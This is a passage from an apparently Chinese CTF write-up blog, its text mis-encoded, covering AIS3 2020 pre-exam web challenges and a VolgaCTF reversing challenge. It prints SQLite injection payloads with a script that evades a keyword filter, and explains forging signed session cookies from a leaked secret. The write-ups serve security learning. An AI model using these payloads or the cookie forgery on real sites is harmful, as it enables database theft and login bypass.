class="title">white</span> <span class="title">pt</span>-5&quot;&gt;<span class="title">GUESS</span> <span class="title">THE</span> <span class="title">STUPID</span> <span class="title">USERNAME</span> / <span class="title">PASSWORD</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">row</span>&quot; <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">justify</span>-<span class="title">content</span>-<span class="title">center</span> <span class="title">align</span>-<span class="title">items</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">column</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">box</span>&quot; <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">form</span> <span class="title">id</span>=&quot;<span class="title">login</span>-<span class="title">form</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>&quot; <span class="title">action</span>=&quot;?<span class="title">action</span>=<span class="title">login</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">hidden</span>&quot; <span class="title">name</span>=&quot;<span class="title">csrf_token</span>&quot; <span class="title">value</span>=&quot;&lt;?= <span class="title">htmlentities</span>($<span class="title">csrf</span>-&gt;<span class="title">generate</span>()) ?&gt;&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">info</span>&quot;&gt;ğŸ¦‰: &quot;<span class="title">Login</span> <span class="title">to</span> <span class="title">see</span> <span class="title">cool</span> <span class="title">things</span>!&quot;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">name</span>&quot; <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">name</span>&quot; <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">Password</span>:&lt;/<span class="title">label</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">password</span>&quot; <span class="title">id</span>=&quot;<span class="title">password</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot;&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">group</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">info</span> <span class="title">btn</span>-<span class="title">md</span>&quot; <span class="title">value</span>=&quot;<span class="title">Login</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">else</span>: ?&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">white</span> <span class="title">pt</span>-5&quot;&gt;&lt;<span class="title">a</span> <span class="title">style</span>=&quot;<span class="title">color</span>: <span class="title">white</span>&quot; <span class="title">href</span>=&quot;/?<span class="title">source</span>&quot;&gt;<span class="title">SHOW</span> <span class="title">HINT</span>&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span> <span class="title">justify</span>-<span class="title">content</span>-<span class="title">center</span> <span class="title">align</span>-<span class="title">items</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">info</span>&quot;&gt;<span class="title">Nothing</span>&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                        <span class="title">Hello</span>, &lt;<span class="title">b</span>&gt;&lt;?= <span class="title">htmlentities</span>($<span class="title">user</span>) ?&gt;&lt;/<span class="title">b</span>&gt;, <span class="title">nothing</span> <span class="title">here</span>.</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">action</span>=<span class="title">logout</span>&quot;&gt;<span class="title">Logout</span>!&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span> ?&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å°±æ˜¯ sqlite çš„ SQL Injectionï¼Œè¼¸å…¥çš„ username æœƒç”¨ <code>str_ireplace</code> éæ¿¾å…©æ¬¡ï¼Œå¾ˆå¥½ç¹éï¼Œæ‰“ <code>///***</code> å°±æœƒè¢«éæ¿¾æˆ <code>/*</code>ï¼Œæ‰“ <code>selselselectectect</code> å°±æœƒè¢«éæ¿¾æˆ <code>select</code>ï¼Œæ‰€ä»¥å¯«å€‹ç°¡å–®çš„ script è‡ªå‹•è½‰æ› payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">table = &#123;</span><br><span class="line">    <span class="string">&#x27; &#x27;</span>: <span class="string">&#x27;/**/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/*&#x27;</span>: <span class="string">&#x27;///***&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*/&#x27;</span>: <span class="string">&#x27;***///&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;union&#x27;</span>: <span class="string">&#x27;unununionionion&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;select&#x27;</span>: <span class="string">&#x27;selselselectectect&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;and&#x27;</span>: <span class="string">&#x27;anananddd&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;or&#x27;</span>: <span class="string">&#x27;ooorrr&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;where&#x27;</span>: <span class="string">&#x27;whewhewhererere&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;from&#x27;</span>: <span class="string">&#x27;frfrfromomom&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inp = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> t,v <span class="keyword">in</span> table.items():</span><br><span class="line">    inp = inp.replace(t, v)</span><br><span class="line"><span class="built_in">print</span>(inp)</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„åˆ° <code>--</code> é‚„æ˜¯æ²’è¾¦æ³•ç”¨ï¼Œå› ç‚º <code>-selselectect-</code> æœƒè¢«è½‰æˆç©ºçš„ï¼Œ<code>select</code> é †åºåœ¨ <code>--</code> å‰é¢æœƒå…ˆè¢«éæ¿¾æ‰ï¼Œ<code>str_ireplace</code> æ˜¯ç…§è‘— list ä¸€å€‹å€‹ replace çš„ï¼Œä¸éæˆ‘å€‘ç”¨ <code>/*</code> å°±è¶³å¤ äº†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;///******///unununionionion///******///selselselectectect///******///null,sql,null///******///frfrfromomom///******///sqlite_master///******///whewhewhererere///******///type=&#x27;table&#x27;///******///limit///******///1///******///offset///******///0///***</span><br></pre></td></tr></table></figure>
<p>å…ˆæŒ– tableï¼Œæ‰¾åˆ° <code>CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )</code>ï¼Œåªæœ‰é€™å€‹ <code>garbage</code> å’Œ <code>users</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;///******///unununionionion///******///selselselectectect///******///null,name,null///******///frfrfromomom///******///garbage///******///limit///******///1///******///offset///******///0///***</span><br></pre></td></tr></table></figure>
<p>å†æŒ– db è£¡é¢ï¼ŒæŒ–åˆ°æœ‰å€‹ name æ˜¯ <code>something good</code>ï¼ŒæŒ–ä»–çš„ value å°±çœ‹åˆ° flag äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;4_ch1ld_15_4_curly_d1mpl3d_lun471c&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Rhino">Rhino</h3>
<p>é€™é¡Œç¶²ç«™åœ¨ <a target="_blank" rel="noopener" href="https://rhino.ais3.org/%EF%BC%8C">https://rhino.ais3.org/ï¼Œ</a><code>robots.txt</code> å¯ä»¥çœ‹åˆ°æ±è¥¿</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># RIP robots!</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /index.html</span><br><span class="line">Disallow: /*.xml</span><br><span class="line">Disallow: /recent</span><br><span class="line">Disallow: /assets</span><br><span class="line">Disallow: /about</span><br><span class="line">Disallow: /*.js</span><br><span class="line">Disallow: /*.json</span><br><span class="line">Disallow: /node_modules</span><br><span class="line">Disallow: /flag.txt</span><br></pre></td></tr></table></figure>
<p>ç„¶å¾Œé€™å€‹ç¶²ç«™çœ‹èµ·ä¾†æ˜¯ç”¨ express æ¶çš„ç„¶å¾Œæ”¾ jekyll ç”¢çš„ blogï¼Œæ—¢ç„¶æ˜¯ js project å…ˆçœ‹å€‹ <code>package.json</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;app&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node chill.js&quot;,</span><br><span class="line">    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;author&quot;: &quot;djosix&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;cookie-session&quot;: &quot;^1.4.0&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;^4.17.1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç„¶å¾Œå°±çœ‹åˆ°åŸå§‹ç¢¼å«åš <code>chill.js</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&#x27;cookie-session&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  <span class="attr">secret</span>: <span class="string">&quot;I&#x27;m watching you.&quot;</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/&#x27;</span>, express.<span class="title function_">static</span>(<span class="string">&#x27;./&#x27;</span>));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag.txt&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> n = req.<span class="property">session</span>.<span class="property">magic</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &amp;&amp; (n + <span class="number">420</span>) === <span class="number">420</span>)</span><br><span class="line">    res.<span class="title function_">sendFile</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&#x27;you are a sad person too&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;*&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>)&#123;</span><br><span class="line">  res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">sendFile</span>(<span class="string">&#x27;404.html&#x27;</span>, &#123; <span class="attr">root</span>: __dirname &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(process.<span class="property">env</span>.<span class="property">PORT</span>, <span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>çœ‹èµ·ä¾†åªè¦è®“ä»–çš„ <code>n &amp;&amp; (n + 420) === 420</code> å°±å¯ä»¥è®€ flag äº†ï¼Œä»¥å‰å°±å¾ˆå¸¸çœ‹åˆ° FB ä¸Šæœ‰äºº po ä¸€äº› js çš„æ¢—åœ–èªªæ˜ js å¾ˆå¤æ€ªçš„è¡Œç‚ºï¼Œéš¨ä¾¿çœ‹äº†å¹¾å¼µè¤‡ç¿’ä¸€ä¸‹ï¼Œå°±æƒ³åˆ°æœ‰æµ®é»æ•¸èª¤å·®çš„å•é¡Œï¼Œæ‰€ä»¥ <code>n</code> è¨­æˆ <code>0.00000000000001</code> å°±å¯ä»¥äº†ï¼Œ<code>n</code> æ˜¯å¾ <code>req.session.magic</code> æŠ“çš„ï¼Œæ‰€ä»¥æˆ‘å€‘è¦è¨­ <code>req.session.magic</code> çš„è©±ï¼Œæœ€ç°¡å–®çš„æ–¹å¼å°±æ˜¯è‡ªå·±æŠŠ server æ¶èµ·ä¾†ï¼Œç„¶å¾Œå¤šåŠ ä¸€è¡Œ <code>req.session.magic = 0.00000000000001</code>ï¼Œå°±å¯ä»¥ç”¢å‡º <code>express:sess</code> å’Œ <code>express:sess.sig</code> å…©å€‹ Cookie äº†ï¼Œsig æ˜¯ç”¨å‰é¢è¨­å®šçš„ <code>secret: &quot;I'm watching you.&quot;</code> ç®—å‡ºä¾†çš„ï¼Œè©³æƒ…å¯ä»¥çœ‹ <a target="_blank" rel="noopener" href="https://www.npmjs.com/package/cookie-session">cookie-session</a>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;h4v3_y0u_r34d_7h3_rh1n0_b00k?&#125;</span><br></pre></td></tr></table></figure>
</div><div class="article-more-container"><a class="article-more button is-small is-size-7" href="/2020/06/09/ais3-2020-preexam/#more">Read more</a></div></article></div><div class="card card-readmore"><article class="card-content article" role="article"><div class="article-meta is-size-7 level is-mobile"><div class="level-left"><i class="material-icons">calendar_month</i><span class="level-item"><time dateTime="2020-05-03T16:00:00.000Z" title="5/4/2020, 12:00:00 AM">2020-05-04</time></span><i class="material-icons">schedule</i><span class="level-item">7 minutes</span><i class="material-icons">category</i><span class="level-item"><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/">è³‡å®‰</a><span>Â /Â </span><a class="link-muted" href="/categories/%E8%B3%87%E5%AE%89/writeups/">writeups</a></span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/05/04/f-hash/">ã€CTF Writeupsã€‘VolgaCTF Quals 2020 - F-Hash</a></h1><div class="content"><p>é€™é¡Œçµ¦äº†ä¸€å€‹ x86-64 ELF Executableï¼Œç›´æ¥è·‘ä¸‹å»è·‘ä¸å‡ºä¾†ï¼Œä¸€ç›´å¡åœ¨é‚£è£¡ï¼Œé€†å‘ä¸€ä¸‹æœƒç™¼ç¾ <code>13B0</code> é€™å€‹å‡½å¼æ˜¯ä¸€å€‹éè¿´å‡½å¼ï¼Œä»–çš„è™›æ“¬ç¢¼å¤§æ¦‚é•·ä¸‹é¢é€™æ¨£ï¼Œæœƒä¸€ç›´éè¿´å‘¼å«å‰å…©å±¤çš„ç­”æ¡ˆï¼Œå¾ˆæ˜é¡¯çš„æœ‰å¾ˆå¤šé‡è¤‡çš„å­å•é¡Œï¼Œé€™æ™‚å€™å°±æ˜¯è¦ç”¨ Dynamic Programming çš„æ€è·¯ä¾†æŠŠç®—éçš„ç­”æ¡ˆè¨˜ä¸‹ä¾†å°±ä¸æœƒè·‘é‚£éº¼ä¹…äº†ï¼Œæ‰€ä»¥é€™é¡Œå°±æ˜¯è¦å„ªåŒ–é€™å€‹å‡½å¼ï¼ŒæŠŠç¨‹å¼è·‘å®Œå°±æœƒå°å‡º flagã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_13B0</span>(<span class="params">depth, a, b</span>):</span><br><span class="line">    ...</span><br><span class="line">    r1 = _13B0(depth - <span class="number">1</span>, a, b)</span><br><span class="line">    r2 = _13B0(depth - <span class="number">2</span>, a, b)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>ä»¥ä¸‹æä¾›ä¸‰ç¨®è§£æ³•ï¼Œè®€è€…å¯ä»¥è·Ÿè‘—ç·´ç¿’ä¸€ä¸‹ã€‚</p>
<h2 id="Rewrite-Function-with-Python">Rewrite Function with Python</h2>
<p>æœ€ç›´è¦ºçš„æ–¹æ³•å°±æ˜¯æŠŠ IDA decompile å‡ºä¾†çš„ code æ¬åˆ° python ä¸Šé‡å¯«ä¸€ä¸‹ï¼Œæ²’ä»€éº¼æŠ€è¡“ï¼Œé€™æ˜¯æˆ‘åœ¨è³½ä¸­ç”¨çš„æ–¹æ³•ï¼Œä½†å°±æ˜¯è¦æ³¨æ„ä¸€ä¸‹å‹æ…‹çš„å•é¡Œï¼Œæ¯”å¦‚å…©å€‹ unsigned int ç›¸ä¹˜å¯èƒ½ overflow åœ¨ python è£¡é¢è¦ <code>mod (1 &lt;&lt; 32)</code>ï¼Œæ›´å¤šç´°ç¯€è«‹çœ‹ä¸‹é¢çš„ç¨‹å¼ç¢¼ã€‚</p>
<figure class="highlight python"><figcaption><span>solve-rewrite.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line">table = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    table += [i * <span class="number">10</span> + <span class="number">1</span> + (<span class="number">0xf6</span> &lt;&lt; <span class="number">120</span>)] * <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bitcountsum</span>(<span class="params">a, b</span>):</span><br><span class="line">    a %= (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)</span><br><span class="line">    b %= (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bin</span>(a).count(<span class="string">&#x27;1&#x27;</span>) + <span class="built_in">bin</span>(b).count(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">a, b, depth = <span class="number">256</span></span>):</span><br><span class="line">    ans = [<span class="number">0</span>]</span><br><span class="line">    ans.append((bitcountsum(a, b), <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    ans.append((bitcountsum(a ^ <span class="number">1</span>, b), <span class="number">0</span>, <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, depth + <span class="number">1</span>):</span><br><span class="line">        v15, v16 = ans[i - <span class="number">1</span>], ans[i - <span class="number">2</span>]</span><br><span class="line">        v13 = ((v15[<span class="number">0</span>] + v15[<span class="number">1</span>] * (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)) + (v16[<span class="number">0</span>] + v16[<span class="number">1</span>] * (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)) + bitcountsum((v15[<span class="number">2</span>] + v16[<span class="number">2</span>]) ^ a, b)) % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">        v14 = table[i]</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> (v14 &gt;&gt; <span class="number">64</span>) &gt; (v13 &gt;&gt; <span class="number">64</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> (v14 &gt;&gt; <span class="number">64</span>) == (v13 &gt;&gt; <span class="number">64</span>):</span><br><span class="line">                <span class="keyword">if</span> v14 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) &gt;= v13 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            k = <span class="built_in">max</span>(<span class="number">1</span>, (v13 &gt;&gt; <span class="number">64</span>) // (v14 &gt;&gt; <span class="number">64</span>))</span><br><span class="line">            v13 = (v13 - k * v14) % (<span class="number">1</span> &lt;&lt; <span class="number">128</span>)</span><br><span class="line">        ans.append((v13 % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>), (v13 &gt;&gt; <span class="number">64</span>), (v15[<span class="number">2</span>] + v16[<span class="number">2</span>]) % (<span class="number">1</span> &lt;&lt; <span class="number">64</span>)))</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">al = [<span class="number">0x6369757120656854</span>, <span class="number">0x706d756a20786f66</span>, <span class="number">0x20797a616c206568</span>, <span class="number">0</span>]</span><br><span class="line">bl = [<span class="number">0x206e776f7262206b</span>, <span class="number">0x74207265766f2073</span>, <span class="number">0x80676f64</span>, <span class="number">0x2b</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(al, bl):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">hex</span>, calc(a, b)[<span class="number">256</span>])))</span><br></pre></td></tr></table></figure>
<h2 id="GDB">GDB</h2>
<p>å¦ä¸€å€‹æ–¹æ³•æ˜¯æˆ‘åœ¨è³½å¾Œçœ‹ <a target="_blank" rel="noopener" href="https://pastebin.com/Dj6wteXk">åˆ¥äºº</a> ç”¨çš„ï¼Œåœ¨ gdb å¯« python å» hook <code>13B0</code> çš„é–‹é ­å’Œçµå°¾ï¼Œåœ¨é–‹é ­åˆ¤æ–·é€™çµ„åƒæ•¸æœ‰æ²’æœ‰å‡ºç¾éäº†ï¼Œè·‘éå°±æŠŠåƒæ•¸çš„ <code>depth</code> è¨­æˆ 1 ä¹Ÿå°±æ˜¯ base case è®“ä»–ä¸è¦å†å¾€ä¸‹éè¿´äº†ï¼Œè€Œå› ç‚ºåŒä¸€çµ„å‡½å¼çš„ <code>Start, End</code> Hook æ²’è¾¦æ³•å…±äº«è³‡è¨Šï¼Œæ‰€ä»¥éœ€è¦ç¶­è­·ä¸€å€‹ <code>state</code> ä¾†æ”¾ç›®å‰çš„åƒæ•¸ï¼Œåœ¨çµå°¾çš„æ™‚å€™ä¸€æ¨£æ˜¯çœ‹é€™çµ„åƒæ•¸æœ‰æ²’æœ‰å‡ºç¾éï¼Œæœ‰å°±æŠŠç­”æ¡ˆå¯«ä¸Šå»ï¼Œæ²’æœ‰å°±æŠŠç­”æ¡ˆå­˜èµ·ä¾†ä¸‹æ¬¡å°±ä¸æœƒå†è·‘ä¸€æ¬¡äº†ã€‚</p>
